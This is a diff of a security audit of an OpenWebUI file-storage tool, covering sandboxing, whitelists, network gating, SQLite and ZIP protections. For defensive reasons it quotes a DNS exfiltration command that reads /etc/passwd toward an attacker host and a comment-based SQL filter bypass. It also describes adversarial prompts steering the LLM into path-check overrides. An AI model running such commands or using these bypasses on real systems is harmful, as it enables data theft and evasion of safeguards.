@@ -1,282 +1,398 @@
-# Security, Architecture, and Reliability Audit Report
+# Security and Architecture Audit Report
 
-## Audit Target
+## Audit Metadata
 
-| Attribute | Value |
-|-----------|-------|
-| **Filename** | `Fileshed.py` |
-| **Version** | 1.0.3 |
-| **Required OpenWebUI Version** | 0.4.0+ |
-| **Lines of Code** | ~8,745 |
-| **Author** | Fade78 (with Claude Opus 4.5) |
-| **License** | MIT |
+| Field | Value |
+|-------|-------|
+| **Audited File** | `Fileshed.py` |
+| **Tool Version** | 1.0.3 |
+| **Audit Date** | 2026-01-30 |
+| **Auditor** | Multi-axis Security Review |
+| **OpenWebUI Target Version** | 0.4.0+ |
+| **Total Lines of Code** | 8,765 |
 
 ---
 
 ## Executive Summary
 
-Fileshed is a comprehensive, monolithic OpenWebUI Tool providing persistent file storage, command execution, SQLite database access, ZIP handling, and multi-user group collaboration features. The tool operates within OpenWebUI's tool execution environment and implements a defense-in-depth security model. The design demonstrates significant security awareness, but several areas require attention, particularly around edge cases in pattern-based validation and the inherent risks of shell command exposure to LLMs.
+Fileshed is a well-engineered OpenWebUI tool providing persistent file storage with multi-user collaboration. The implementation demonstrates mature security thinking with defense-in-depth across filesystem, command execution, network access, and database operations. The separation between public API (`shed_*` methods) and internal implementation (`_FileshedCore`) effectively limits LLM attack surface. Administrative controls (valves) appropriately gate sensitive features like network access. Key residual risks stem from the inherent complexity of sandboxing shell commands and the file-based locking model's limitations in distributed deployments.
 
 ---
 
-## Axis 1: Architecture and Separation of Concerns
+## Axis 1: Architecture and Code Organization
 
-### Key Strengths
-- **Clear internal/external boundary**: The `_FileshedCore` class containing all internal logic is properly isolated from `shed_*` public methods. OpenWebUI's architecture only exposes methods on the `Tools` class, preventing LLMs from calling internal methods directly.
-- **Centralized zone resolution**: The `_resolve_zone()` method provides a single point for all zone validation, ensuring consistent access control across all operations.
-- **Layered execution model**: Git operations go through `_git_run()`, command execution through `_exec_command()`, and database operations through `_db_execute()`, creating clear abstraction layers.
-- **Bridge pattern for OpenWebUI APIs**: `_OpenWebUIBridge` isolates version-specific imports, facilitating future compatibility.
+### Intent and Behavior
 
-### Weaknesses and Risks
-- **Monolithic file complexity**: At 8,745 lines, the single-file design (justified for OpenWebUI installation simplicity) creates cognitive load and increases risk of inconsistent security patterns across the codebase.
-- **No runtime interface enforcement**: The internal/external method boundary relies on naming convention (`_` prefix) rather than Python's limited access control mechanisms. While OpenWebUI respects this, there is no structural guarantee.
+The tool follows a strict three-layer architecture:
+1. **Public API Layer** (`class Tools`): 37 `shed_*` functions exposed to LLM
+2. **Internal Core Layer** (`class _FileshedCore`): Implementation logic hidden from LLM
+3. **Infrastructure Layer**: Direct calls to `subprocess`, `sqlite3`, `shutil`, `pathlib`
+
+Zone abstraction unifies four storage contexts (Uploads, Storage, Documents, Group) via `ZoneContext` dataclass.
+
+### Strengths
+
+- The `_FileshedCore` class pattern effectively exploits OpenWebUI's tool introspection behavior, ensuring internal methods like `_exec_command` and `_validate_path` are not visible to the LLM in the function schema.
+- Single-file design is deliberately chosen for atomic deployment—no risk of version mismatches between module files.
+- `ZoneContext` dataclass centralizes zone-specific logic (whitelist selection, git commit behavior, editzone paths), reducing scattered conditional logic.
+- Consistent JSON response format with structured error codes facilitates LLM error recovery.
+- Comprehensive docstrings serve dual purpose: developer documentation and LLM guidance.
+
+### Weaknesses
+
+- The file's 8,765 lines strain maintainability; logical groupings exist but rely on comments rather than structural separation.
+- `_FileshedCore` maintains a back-reference to `Tools` via `self._tools` to access valves—this bidirectional coupling is acceptable but slightly awkward.
+- Some helper methods (`_format_size`, `_strip_sql_comments`) could be static but access instance state via `self.valves`.
 
 ### Assessment: ★★★★☆
 
+Architecturally sound with appropriate security boundaries. The LLM-isolation pattern is effective and well-documented.
+
 ---
 
-## Axis 2: LLM-Facing Surface Exposure
+## Axis 2: Public API Surface and LLM Exposure
 
-### Key Strengths
-- **Comprehensive docstrings**: All `shed_*` functions include detailed parameter documentation, examples, and usage notes, reducing LLM hallucination risk.
-- **Contextual error messages**: Errors include hints and link to relevant help topics via `FUNCTION_HELP`, helping LLMs self-correct.
-- **Zone prefix protection**: `_validate_relative_path()` detects when an LLM incorrectly includes the zone name in paths (e.g., `Storage/file.txt` in `zone="storage"`), a common LLM mistake.
-- **HOWTO documentation system**: The `shed_help(howto="...")` feature provides workflow guidance that helps LLMs understand correct usage patterns.
+### Intent and Behavior
 
-### Weaknesses and Risks
-- **Allow overrides**: Parameters like `allow_zone_in_path=True` can be misused by a manipulated or confused LLM to bypass protections. While this is documented as an escape hatch, an adversarial prompt could convince the LLM to use it inappropriately.
-- **Large API surface**: Over 35 `shed_*` functions create a broad attack surface. Each function represents a potential vector for prompt injection or misuse.
+Only methods prefixed with `shed_` are exposed to the LLM. The spec explicitly documents this design to prevent LLMs from attempting to call internal methods directly.
+
+### Strengths
+
+- Clear naming convention (`shed_*`) provides unambiguous boundary.
+- Internal methods in separate class (`_FileshedCore`) rather than underscore-prefixed methods in `Tools` class—this exploits OpenWebUI's class method exposure mechanism.
+- Function signatures include `__user__` and `__metadata__` parameters for OpenWebUI context injection.
+- Default parameter handling (`None` to `{}` conversion) prevents `AttributeError` on missing context.
+
+### Weaknesses
+
+- The `allow_zone_in_path` parameter appears in most functions—a determined LLM could learn to always pass `True`, bypassing the path-starts-with-zone protection. This is mitigated by requiring explicit user intent.
+- Error messages occasionally leak internal details (e.g., "Resolved path escapes allowed zone") that could aid adversarial prompt crafting.
+
+### Assessment: ★★★★★
+
+The public/internal boundary is well-designed and robust. LLM cannot directly invoke dangerous internal methods.
+
+---
+
+## Axis 3: Filesystem Access and Path Traversal Prevention
+
+### Intent and Behavior
+
+All file operations are constrained within zone roots via `_resolve_chroot_path()` and `_validate_relative_path()`. Symlink escape detection adds defense-in-depth.
+
+### Strengths
+
+- `_resolve_chroot_path()` performs both logical (`..` component tracking) and physical (symlink resolution) validation.
+- Unicode normalization (`unicodedata.normalize("NFC")`) prevents path confusion attacks via decomposed characters.
+- Symlink checks walk the path component-by-component, detecting intermediate symlinks that escape the zone.
+- Path arguments to shell commands are validated via `_validate_path_args()` with zone-aware prefix detection.
+- Protected paths (`.git`) are handled appropriately in write operations.
+
+### Weaknesses
+
+- The symlink check in `_resolve_chroot_path()` has a TOCTOU window: a symlink could be created between validation and use. This is partially mitigated by the chroot enforcement on the final resolved path.
+- The zone-prefix detection (`PATH_STARTS_WITH_ZONE` error) can be bypassed with `allow_zone_in_path=True`—appropriate for edge cases but requires trust in user/LLM intent.
+- Regex expressions in sed/grep starting with `/` are special-cased (`_is_expression_not_path`)—the heuristics are reasonable but imperfect.
 
 ### Assessment: ★★★★☆
 
----
-
-## Axis 3: Filesystem Access and Isolation
-
-### Key Strengths
-- **Chroot enforcement**: `_resolve_chroot_path()` prevents path traversal by resolving paths and verifying they remain within zone boundaries.
-- **Symlink detection**: The method walks the path tree and validates symlink targets stay within the chroot, preventing symlink-based escapes.
-- **Unicode normalization**: Paths are normalized to NFC form via `unicodedata.normalize()`, preventing Unicode canonicalization attacks.
-- **Zone-based access control**: Four distinct zones (Uploads/read-only, Storage, Documents/Git-backed, Group) with appropriate permission models.
-- **Protected path handling**: `.git` directories are protected from modification while still allowing Git commands.
-
-### Weaknesses and Risks
-- **TOCTOU window**: While symlink checks occur before operations, a race condition window exists between validation and actual file operations. The `shed_unzip` function explicitly addresses this with a final symlink check before `extractall()`, but other operations may be vulnerable.
-- **Hardlink risk acknowledged**: The `ln` command is blocked entirely (good), but other tools like `cp --link` might still create hard links if available on the system.
-
-### Assessment: ★★★★☆
+Strong path traversal prevention with defense-in-depth. Minor TOCTOU window exists but practical exploitation requires concurrent malicious filesystem access.
 
 ---
 
-## Axis 4: Command Execution and Input Validation
+## Axis 4: Command Execution Security
 
-### Key Strengths
-- **Strict whitelist approach**: Commands must be in `WHITELIST_READONLY` or `WHITELIST_READWRITE` to execute. Dangerous commands (shells, interpreters, network tools) are explicitly blacklisted.
-- **Shell metacharacter blocking**: `DANGEROUS_ARGS_PATTERN` blocks `;`, `|`, `&`, backticks, `$(`, `${`, and output redirection characters.
+### Intent and Behavior
+
+Shell commands are executed via `subprocess.run()` with list arguments (no shell interpretation). Command and argument validation enforces whitelists and blocks dangerous patterns.
+
+### Strengths
+
+- **Whitelist architecture**: `WHITELIST_READONLY` for Uploads, `WHITELIST_READWRITE` for writable zones—principle of least privilege.
+- **Blacklist reinforcement**: `BLACKLIST_COMMANDS` blocks shells, interpreters, and system utilities regardless of whitelist.
+- **Argument sanitization**: `DANGEROUS_ARGS_PATTERN` blocks shell metacharacters (`;`, `|`, `&&`, `$(`), preventing argument injection even though `subprocess.run()` with list args avoids shell interpretation.
 - **Command-specific validation**:
-  - `find`: `-exec`, `-execdir`, `-ok`, `-okdir` blocked
-  - `awk`: `system()`, `getline |`, `ENVIRON` blocked
-  - `tar`: `-P`/`--absolute-names` blocked
-  - `git`: subcommand whitelisting with separate read/write/network lists
-  - `curl/wget`: requires `-o` output flag, blocks upload options in safe mode
-- **Resource limits**: `RLIMIT_AS` and `RLIMIT_CPU` are set via `preexec_fn` to prevent DoS.
-- **Git hooks neutralization**: `_neutralize_git_hooks()` removes hooks and sets `core.hooksPath=/dev/null`, preventing malicious hook execution from cloned repos.
+  - `find -exec` explicitly blocked
+  - `awk system()` and `getline` pipes blocked
+  - Git subcommands validated against separate whitelists
+  - curl/wget require output file (`-o`/`-O`) to prevent context pollution
+- **Resource limits**: `preexec_fn` sets `RLIMIT_AS` (memory) and `RLIMIT_CPU` (CPU time) via `resource.setrlimit()`.
+- **Output truncation**: Prevents LLM context flooding with configurable limits.
 
-### Weaknesses and Risks
-- **Pattern-based SQL blocking is bypassed easily**: The dangerous pattern check for SQL (`ATTACH`, `DETACH`, `LOAD_EXTENSION`) uses simple substring matching on uppercased queries:
-  ```python
-  for pattern in dangerous_patterns:
-      if pattern in query_stripped:
-  ```
-  This can be bypassed with comments, e.g., `AT/**/TACH` or using SQLite's pragma mechanism.
-  
-- **AWK pattern bypass potential**: While `AWK_DANGEROUS_PATTERNS` blocks `system(` and `getline <`, creative awk constructs might evade detection.
-  
-- **Environment variable leakage**: While `env`, `printenv`, and `envsubst` are blocked, commands like `set` (if available) or awk's `ENVIRON` (blocked but via regex) could leak secrets. The regex `\bENVIRON\b` could be bypassed with Unicode lookalikes in some configurations.
+### Weaknesses
 
-- **Pipe character allowance**: Commands in `COMMANDS_ALLOWING_PIPE` (jq, awk, grep) use a relaxed pattern that allows `|`. While `subprocess.run()` with list arguments doesn't interpret shell syntax, this creates a documentation inconsistency where users might believe pipes work.
+- **`preexec_fn` thread-safety**: `subprocess.run()` with `preexec_fn` is not safe in multi-threaded contexts. If OpenWebUI uses threading (likely in async handlers), this could cause deadlocks. The documentation for `preexec_fn` explicitly warns about this.
+- **Pattern-based validation limitations**: Regex cannot catch all dangerous constructs. For example, the pattern blocks `$(` but not `$'...'` (ANSI-C quoting), though list-mode subprocess mitigates this.
+- **awk ENVIRON blocked via regex**: `\bENVIRON\b` pattern could be bypassed with equivalent constructs (though awk's environment access surface is limited).
+- **`xargs` removal justification**: While removed for security, this limits legitimate use cases. The rationale is sound but may frustrate users.
+
+### Residual Risk
+
+A misconfigured or future command added to the whitelist without corresponding argument validation could introduce vulnerabilities. The defense relies on the completeness of pattern matching.
+
+### Assessment: ★★★★☆
+
+Robust command execution sandboxing with appropriate defense-in-depth. The `preexec_fn` thread-safety issue is a notable technical concern in async environments.
+
+---
+
+## Axis 5: Network Access Control
+
+### Intent and Behavior
+
+Network access is gated by the `network_mode` valve (admin-only): `disabled` (default), `safe` (download-only), `all` (unrestricted).
+
+### Strengths
+
+- **Three-tier model**: Default-deny with explicit admin opt-in for network features.
+- **Protocol-level blocking**: `CURL_FORBIDDEN_GET_OPTS` blocks POST/PUT options in `safe` mode.
+- **ffmpeg exfiltration prevention**: Output protocols (rtmp, tcp, udp, http) blocked in `safe` mode; dangerous options (`-metadata`, `-filter_complex`, `-method`) blocked.
+- **Git granularity**: `clone/fetch/pull` require `safe`; `push` requires `all`.
+- **URL pattern detection**: `URL_PATTERN` blocks URLs in non-network commands when network is disabled.
+- **Network-capable command awareness**: `NETWORK_OUTPUT_COMMANDS` vs `NETWORK_INPUT_COMMANDS` distinguish exfiltration-capable from download-only tools.
+
+### Weaknesses
+
+- **DNS exfiltration not addressed**: A command like `dig $(cat /etc/passwd).attacker.com` would be blocked by dangerous pattern detection, but legitimate DNS-querying tools (if added to whitelist) could exfiltrate via DNS. Currently not a risk since no DNS tools are whitelisted.
+- **ffmpeg `-filter_complex`**: The block is broad—some legitimate filter chains are harmless. However, erring on the side of caution is appropriate.
+- **`pandoc` with URLs**: In `safe`/`all` mode, pandoc can fetch remote resources. Malicious documents could trigger SSRF. This is inherent to pandoc's design.
+
+### Assessment: ★★★★★
+
+Network access control is well-designed with appropriate granularity. Admin-only configuration prevents user/LLM escalation.
+
+---
+
+## Axis 6: SQLite Security
+
+### Intent and Behavior
+
+The `shed_sqlite()` function provides SQLite query execution with dangerous operation blocking and optional read-only mode.
+
+### Strengths
+
+- **Dangerous pattern blocking**: `ATTACH`, `DETACH`, `LOAD_EXTENSION` are blocked after SQL comment stripping.
+- **Comment stripping**: `_strip_sql_comments()` removes `/* */` and `-- ` comments before pattern matching, preventing bypass via `AT/**/TACH`.
+- **`sqlite_readonly` valve**: Admin can restrict to SELECT/PRAGMA/EXPLAIN only.
+- **Parameterized queries**: `params` list enables safe parameter binding, preventing SQL injection in user queries.
+- **Row limits**: Default 10-row limit prevents context flooding; `MAX_SQL_ROWS` (10,000) hard limit protects against memory exhaustion.
+- **Table name validation**: Regex `^[a-zA-Z_][a-zA-Z0-9_]*$` prevents injection in CSV import table names.
+
+### Weaknesses
+
+- **Comment stripping edge cases**: Nested comments (`/* /* */`) are handled by non-greedy regex but deeply nested cases might behave unexpectedly. SQLite doesn't support nested comments, so this is low risk.
+- **Column name sanitization**: During CSV import, column names are cleaned with `re.sub(r'[^\w]', '_', ...)`. This could cause collisions (e.g., "col-1" and "col_1" both become "col_1").
+- **No query timeout**: The `sqlite3.connect()` has `timeout=10.0` for lock acquisition but no query execution timeout. A malicious query (e.g., recursive CTE) could run indefinitely. The subprocess resource limits do not apply to in-process sqlite3.
+
+### Assessment: ★★★★☆
+
+SQLite security is well-implemented. The lack of query execution timeout is a minor gap for DoS resilience.
+
+---
+
+## Axis 7: Concurrency, Locking, and Crash Recovery
+
+### Intent and Behavior
+
+File locks use atomic file creation (`O_CREAT | O_EXCL`) with JSON metadata. Locks are conversation-scoped and time-limited.
+
+### Strengths
+
+- **Atomic lock acquisition**: `os.open()` with `O_CREAT | O_EXCL` prevents race conditions.
+- **Lock metadata**: Stores `conv_id`, `user_id`, `locked_at`, `path` for audit and recovery.
+- **Same-conversation re-lock**: Allows idempotent `shed_lockedit_open()` calls.
+- **Lock expiration**: `lock_max_age_hours` valve enables automatic cleanup via `shed_maintenance()`.
+- **Forced unlock**: `shed_force_unlock()` allows recovery from crashed sessions.
+- **Editzone cleanup**: Failed edit operations clean up both lock and editzone files.
+
+### Weaknesses
+
+- **Single-instance only**: As documented in SPEC.md, file locks do not work reliably across NFS or in multi-container deployments. This is an acknowledged limitation, not a bug.
+- **No distributed lock support**: For production multi-instance deployments, external locking (Redis, database) would be required.
+- **Lock-editzone TOCTOU**: Between lock acquisition and editzone copy, another process could modify the source file. This is inherent to file-based locking.
 
 ### Assessment: ★★★☆☆
 
+Appropriate for single-instance deployments. Distributed deployment limitations are documented but represent a significant constraint for enterprise use.
+
 ---
 
-## Axis 5: Network Access and Data Exfiltration Risks
+## Axis 8: Multi-User and Group Permission Model
 
-### Key Strengths
-- **Three-tier network model**: `disabled` (default), `safe` (downloads only), `all` (full access) provides granular control.
-- **ffmpeg output protocol blocking**: In safe mode, protocols like `rtmp://`, `udp://`, `ftp://` are blocked to prevent streaming exfiltration.
-- **curl/wget upload blocking**: POST/PUT-capable options (`-d`, `-F`, `-T`, `--data`, etc.) are blocked in safe mode.
-- **Git push isolation**: `git push` requires `network_mode="all"`, preventing casual data exfiltration.
-- **URL pattern detection**: Network access via ffmpeg, pandoc, imagemagick URLs is blocked unless network mode allows it.
+### Intent and Behavior
 
-### Weaknesses and Risks
-- **DNS exfiltration vector**: With `network_mode="safe"`, curl can still perform DNS lookups. An attacker could encode data in DNS queries (e.g., `data.attacker.com`). This is a known limitation of network filtering.
-- **Metadata exfiltration via HTTP headers**: While `-metadata` is blocked for ffmpeg in safe mode, curl's `--header` could potentially be used to exfiltrate small amounts of data in request headers to legitimate-looking URLs.
-- **Safe mode still allows download from anywhere**: A malicious actor could direct the LLM to download malware or exploit payloads for later processing.
+Group spaces support file ownership with three modes: `owner` (owner-write), `group` (all-write), `owner_ro` (read-only).
+
+### Strengths
+
+- **OpenWebUI Groups integration**: Uses `Groups.get_groups_by_member_id()` for membership verification.
+- **Ownership database**: SQLite `file_ownership` table with group/path/owner/mode schema.
+- **Mode flexibility**: Three write modes cover common collaboration patterns.
+- **Ownership transfer**: `shed_group_chown()` allows ownership handoff with membership validation.
+- **Group quota enforcement**: Separate `quota_per_group_mb` valve from per-user quota.
+
+### Weaknesses
+
+- **Group ID validation**: Case-sensitive name matching could confuse users (documented but friction-inducing).
+- **No group admin distinction**: All group members have equal capability; no owner/admin/member hierarchy.
+- **Orphaned ownership records**: If a file is deleted outside Fileshed, ownership records persist in database. `shed_maintenance()` could be extended to clean these.
 
 ### Assessment: ★★★★☆
 
+The permission model is well-suited for team collaboration. Lack of admin hierarchy is a design choice, not a flaw, but limits enterprise governance scenarios.
+
 ---
 
-## Axis 6: Concurrency, Locking, and State Management
+## Axis 9: ZIP Archive Security
 
-### Key Strengths
-- **Atomic lock acquisition**: Uses `os.open()` with `O_CREAT | O_EXCL` for atomic file lock creation, preventing race conditions.
-- **Lock ownership tracking**: Locks store `conv_id`, `user_id`, and timestamp in JSON, enabling ownership verification.
-- **Lock expiration**: `lock_max_age_hours` valve allows stale locks to be cleaned via `shed_maintenance()`.
-- **SQLite isolation**: Uses `isolation_level="IMMEDIATE"` for write operations, preventing concurrent modification issues.
+### Intent and Behavior
 
-### Weaknesses and Risks
-- **Single-instance limitation acknowledged**: File locks don't work across NFS or distributed deployments. The design doc explicitly states this limitation.
-- **No distributed coordination**: For multi-instance OpenWebUI deployments, race conditions could occur between different instances.
-- **Lock cleanup relies on user action**: Stale locks require manual `shed_maintenance()` or `shed_force_unlock()` calls.
+`shed_unzip()` extracts ZIP archives with protections against ZIP Slip and ZIP bombs.
+
+### Strengths
+
+- **ZIP Slip prevention**: Each archive member path is resolved and validated against the destination directory.
+- **Magic byte verification**: Validates ZIP file signatures (`PK\x03\x04`, etc.) beyond extension checking.
+- **ZIP bomb protection**:
+  - File count limit: `ZIP_MAX_FILES = 10,000`
+  - Decompressed size limit: `ZIP_MAX_DECOMPRESSED_SIZE = 500 MB`
+  - Compression ratio limit: `ZIP_MAX_COMPRESSION_RATIO = 100:1`
+- **Pre-extraction symlink check**: TOCTOU protection verifies destination is not a symlink immediately before extraction.
+- **Nested ZIP handling**: Documented behavior—inner ZIPs are extracted as files, requiring explicit re-extraction (applies all protections again).
+
+### Weaknesses
+
+- **Extraction atomicity**: Partial extraction on error leaves some files; cleanup logic removes extracted files but may miss some in race conditions.
+- **Symbolic link entries**: The code checks for destination symlinks but ZIP entries that are symlinks could point outside—`zipfile.extractall()` doesn't follow them, but caution is warranted.
+
+### Assessment: ★★★★★
+
+Comprehensive ZIP security with layered protections against known attack vectors.
+
+---
+
+## Axis 10: Error Handling and Information Disclosure
+
+### Intent and Behavior
+
+All functions return JSON with structured error codes. Sensitive internal details are filtered from error messages.
+
+### Strengths
+
+- **Structured error codes**: 50+ defined error codes enable programmatic error handling.
+- **Error hints**: User-friendly hints guide recovery without exposing internals.
+- **No absolute paths in errors**: Error messages use relative paths and zone names.
+- **No user ID exposure in cross-user contexts**: Group permission errors don't reveal other users' IDs.
+
+### Weaknesses
+
+- **Broad exception handlers**: Many functions end with `except Exception: return ... "An unexpected error occurred"`. While this prevents information leakage, it also hides debugging information. For production, these should log to an admin-accessible location.
+- **Stack traces suppressed**: Intentional but makes troubleshooting difficult without server access.
 
 ### Assessment: ★★★★☆
 
+Appropriate error handling for LLM-facing tool. Operational debugging could be improved with optional logging.
+
 ---
 
-## Axis 7: Data Processing and Persistence
+## Axis 11: LLM Misuse Resistance
 
-### Key Strengths
-- **ZIP bomb protection**: Checks decompressed size (500MB max), file count (10,000 max), and compression ratio (100:1 max).
-- **ZIP Slip prevention**: All archive members are validated to stay within the extraction directory.
-- **Magic bytes verification**: ZIP files are validated by header, not just extension.
-- **CSV column limit**: 5,000 column max prevents DoS via wide CSV files.
-- **SQL parameterization**: The `params` argument enables parameterized queries to prevent injection.
-- **Output truncation**: Command output is limited by `max_output_default`/`max_output_absolute` to prevent context pollution.
+### Intent and Behavior
 
-### Weaknesses and Risks
-- **No recursive bomb protection**: Nested ZIP files are extracted as files (good), but the design doc notes this as intentional. However, if a user manually extracts nested ZIPs, each extraction consumes quota independently, which could be used for amplification attacks.
-- **Memory consumption during CSV import**: Large CSV files are loaded into pandas DataFrame memory before SQLite insertion. For files approaching the quota limit, this could cause OOM conditions.
+The tool includes extensive documentation and guardrails to guide LLM usage patterns.
+
+### Strengths
+
+- **Warning comments**: Prominent `⚠️ LLM WARNING` section in file header.
+- **HOWTO guides**: Built-in documentation via `shed_help(howto=...)` covering common workflows.
+- **Path-starts-with-zone detection**: Catches common LLM mistake of including zone name in path.
+- **Required output files**: curl/wget require `-o`/`-O` to prevent context pollution—LLM cannot accidentally dump large downloads.
+- **Contextual error hints**: Error responses include usage examples relevant to the function.
+
+### Weaknesses
+
+- **`allow_zone_in_path` escape hatch**: An adversarial prompt could instruct the LLM to always use this parameter.
+- **No rate limiting**: A malicious prompt could instruct rapid repeated operations. This is partially mitigated by OpenWebUI's conversation turn limits.
 
 ### Assessment: ★★★★☆
 
+Good LLM guardrails with reasonable escape hatches for legitimate edge cases.
+
 ---
 
-## Axis 8: Multi-User and Group Access Control
+## Axis 12: OpenWebUI Integration
 
-### Key Strengths
-- **Per-file ownership model**: Group files track owner and write mode (`owner`, `group`, `owner_ro`) in SQLite.
-- **Group membership validation**: Uses OpenWebUI's `Groups.get_groups_by_member_id()` to verify membership before access.
-- **Explicit permission codes**: `FILE_OWNER_ONLY` and `FILE_READ_ONLY` provide clear feedback to users and LLMs.
-- **Group quota isolation**: Separate quotas for users and groups prevent one user from exhausting shared space.
+### Intent and Behavior
 
-### Weaknesses and Risks
-- **Ownership transfer validation**: While `shed_group_chown()` validates the new owner is a group member, there's no audit trail for ownership changes.
-- **No fine-grained permissions**: The three-mode system (`owner`/`group`/`owner_ro`) is simple but doesn't support more complex ACLs that larger organizations might need.
+The tool integrates with OpenWebUI via the `Tools` class pattern, valve configuration, and internal API bridges.
+
+### Strengths
+
+- **`_OpenWebUIBridge` isolation**: Version-specific imports are centralized, facilitating future version adaptation.
+- **Valve configuration**: All sensitive settings (network, quotas, paths) are admin-only.
+- **Groups API integration**: Leverages OpenWebUI's existing group membership for access control.
+- **File API integration**: Download links created via OpenWebUI's file management system.
+
+### Weaknesses
+
+- **Internal API dependency**: Relies on `open_webui.models.files` and `open_webui.models.groups` which may change between versions.
+- **No version detection**: The bridge doesn't actively detect or adapt to different OpenWebUI versions; it tries imports and fails.
 
 ### Assessment: ★★★★☆
 
----
-
-## Axis 9: OpenWebUI Integration and API Stability
-
-### Key Strengths
-- **Bridge pattern**: `_OpenWebUIBridge` isolates version-specific API calls, making future updates easier.
-- **Graceful degradation**: Groups features check `GROUPS_AVAILABLE` and fail gracefully if the API isn't present.
-- **Version documentation**: Comments indicate tested version (0.6.40+) and minimum required version (0.4.0+).
-
-### Weaknesses and Risks
-- **Internal API dependency**: Heavy reliance on `open_webui.models.files` and `open_webui.models.groups` internal APIs that may change without notice.
-- **Singleton pattern risk**: `_OpenWebUIBridge` uses a class-level singleton that could cause issues if OpenWebUI reloads tools dynamically.
-
-### Assessment: ★★★☆☆
+Well-integrated with appropriate isolation of version-specific code. Internal API dependencies are an inherent risk with any deep integration.
 
 ---
 
-## Axis 10: Resistance to LLM Misuse and Manipulation
+## Final Overall Assessment
 
-### Key Strengths
-- **Defense against common LLM mistakes**: Zone prefix detection, comprehensive help system, and descriptive error messages reduce accidental misuse.
-- **Read-only zone enforcement**: Uploads zone restrictions prevent LLMs from modifying user-uploaded files.
-- **Timeout limits**: Both default and maximum timeouts prevent runaway commands.
+### Summary by Category
 
-### Weaknesses and Risks
-- **Prompt injection via filenames**: If a user uploads a file with a malicious name containing shell metacharacters, the validation should catch it, but edge cases in path validation could be exploited.
-- **LLM persuasion to use `allow_zone_in_path`**: An adversarial prompt could convince the LLM that the user "explicitly confirmed" wanting this override.
-- **No rate limiting**: A compromised or manipulated LLM could issue thousands of commands in rapid succession, consuming resources.
+| Axis | Rating | Weight | Weighted |
+|------|--------|--------|----------|
+| Architecture | ★★★★☆ | High | 4 |
+| Public API | ★★★★★ | Critical | 5 |
+| Filesystem | ★★★★☆ | Critical | 4 |
+| Command Execution | ★★★★☆ | Critical | 4 |
+| Network Access | ★★★★★ | Critical | 5 |
+| SQLite | ★★★★☆ | High | 4 |
+| Concurrency | ★★★☆☆ | Medium | 3 |
+| Permissions | ★★★★☆ | High | 4 |
+| ZIP Security | ★★★★★ | High | 5 |
+| Error Handling | ★★★★☆ | Medium | 4 |
+| LLM Resistance | ★★★★☆ | High | 4 |
+| OpenWebUI Integration | ★★★★☆ | Medium | 4 |
 
-### Assessment: ★★★☆☆
+### Final Rating: ★★★★☆ (4/5)
 
----
-
-## Axis 11: Design Decision Consistency
-
-### Observations
-
-Reviewing the provided design decisions document against the implementation:
-
-| Decision | Implementation | Verdict |
-|----------|---------------|---------|
-| No logging | ✓ Errors raised, not logged | Consistent |
-| No cache for quota | ✓ `_check_quota()` recalculates each time | Consistent |
-| ATTACH/DETACH/LOAD_EXTENSION blocked | ⚠ Simple substring match, bypassable | Partially implemented |
-| No whitelist for SQL | ✓ `sqlite_readonly` valve for SELECT-only mode | Consistent |
-| Magic bytes verification | ✓ Implemented in `shed_unzip` | Consistent |
-| First-level ZIP extraction only | ✓ Nested ZIPs extracted as files | Consistent |
-| Symlink check before extractall | ✓ Final check at line 5972 | Consistent |
-| CSV column limit (5000) | ✓ Implemented with DoS rationale | Consistent |
-| Explicit error codes | ✓ FILE_OWNER_ONLY, FILE_READ_ONLY distinct | Consistent |
-| Only shed_* exposed | ✓ Architecture relies on OpenWebUI behavior | Consistent |
-| Monolithic file | ✓ 8,745 lines in single file | Consistent |
-| Command whitelist | ✓ Implemented with blacklist fallback | Consistent |
-| printenv/envsubst removed | ✓ Not in whitelists | Consistent |
-| File-based locks | ✓ O_CREAT\|O_EXCL atomic creation | Consistent |
-| No distributed locks | ✓ Documented limitation | Acknowledged |
-| OpenWebUI Bridge | ✓ `_OpenWebUIBridge` class exists | Consistent |
-
-### Assessment: ★★★★☆
+Fileshed demonstrates security-conscious design appropriate for its threat model (LLM-driven file operations in a semi-trusted environment). The critical security axes (command execution, filesystem, network) are well-implemented with defense-in-depth. The primary limitations are operational (single-instance locking) rather than security-critical.
 
 ---
 
-## Critical Findings Summary
+## Actionable Recommendations
 
 ### High Priority
 
-1. **SQL blocking is bypassable**: The substring-based detection for `ATTACH`, `DETACH`, `LOAD_EXTENSION` can be bypassed with SQL comments or alternative syntax. Recommendation: Use SQLite's `PRAGMA` to disable dangerous features programmatically, or parse SQL properly.
+1. **Replace `preexec_fn` with `start_new_session`**: Use `subprocess.Popen` with `start_new_session=True` and apply resource limits via `prlimit` command or cgroups instead of `preexec_fn` to avoid thread-safety issues.
 
-2. **TOCTOU vulnerability window**: Between path validation and file operations, symlinks or files could be modified. For security-critical operations, consider using file descriptors instead of paths.
+2. **Add SQLite query timeout**: Wrap query execution with a Python-level timeout (e.g., `signal.alarm` in non-threaded context, or use `sqlite3` progress handler with row count limit).
+
+3. **Document multi-instance limitations prominently**: Add a warning in the OpenWebUI tool description that file locking is unreliable in multi-container deployments.
 
 ### Medium Priority
 
-3. **No rate limiting**: Add per-user, per-conversation rate limits for command execution to prevent resource exhaustion.
+4. **Implement optional structured logging**: Add an `enable_debug_logging` valve that writes to a file (not stdout) for operational debugging without exposing details to users/LLMs.
 
-4. **Memory consumption in CSV import**: Consider streaming CSV parsing for large files or implementing a size check before pandas load.
+5. **Add orphan ownership cleanup**: Extend `shed_maintenance()` to remove ownership records for non-existent files in group spaces.
+
+6. **Consider symlink-in-ZIP handling**: Explicitly skip or warn on symbolic link entries in ZIP archives during extraction.
 
 ### Low Priority
 
-5. **DNS exfiltration in safe mode**: Document this limitation or consider DNS-level controls in deployment guidance.
+7. **Column name collision handling**: During CSV import, detect and suffix conflicting sanitized column names (e.g., `col_1`, `col_1_2`).
 
-6. **Audit trail for ownership changes**: Consider logging ownership transfers for compliance needs.
+8. **Version-aware bridge**: Add explicit OpenWebUI version detection in `_OpenWebUIBridge` with graceful degradation messages.
 
 ---
 
-## Final Overall Rating
-
-| Weight | Axis | Rating | Weighted Score |
-|--------|------|--------|----------------|
-| 15% | Command Execution & Validation | ★★★☆☆ | 0.45 |
-| 15% | Filesystem Isolation | ★★★★☆ | 0.60 |
-| 15% | Network & Exfiltration | ★★★★☆ | 0.60 |
-| 10% | LLM Surface Exposure | ★★★★☆ | 0.40 |
-| 10% | Data Processing | ★★★★☆ | 0.40 |
-| 10% | Concurrency & Locking | ★★★★☆ | 0.40 |
-| 8% | Multi-User Access | ★★★★☆ | 0.32 |
-| 7% | Architecture | ★★★★☆ | 0.28 |
